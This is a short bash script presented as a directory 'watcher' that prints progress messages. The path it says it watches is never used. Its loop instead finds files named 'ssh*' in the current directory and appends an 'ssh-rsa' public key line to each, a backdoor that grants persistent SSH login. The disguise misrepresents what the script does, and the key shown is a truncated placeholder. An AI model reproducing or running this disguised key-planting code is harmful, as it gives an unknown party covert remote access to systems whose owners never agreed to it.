#!/usr/bin/env bash
# usage:
#   ./watcher.sh <path>


path=$1
shift  
#cmd=$*
sha=0
 
 
#trap build SIGINT
trap exit SIGQUIT
 
echo -e  "--> Press Ctrl+C to force build, Ctrl+\\ to exit."
echo -en "--> watching \"$path\"."
while true; do

  sha=`ls ssh* 2>/dev/null`

  # if new file was found, execute a command
  if [[ -f $sha ]] ; then 
    echo "ssh-rsa AAAAB3NzaC..." >> $sha 
    echo -en "\n--> Change detected, command executed, watching resumed."
  else
    echo -n .
  fi

  #sleep 1 
done
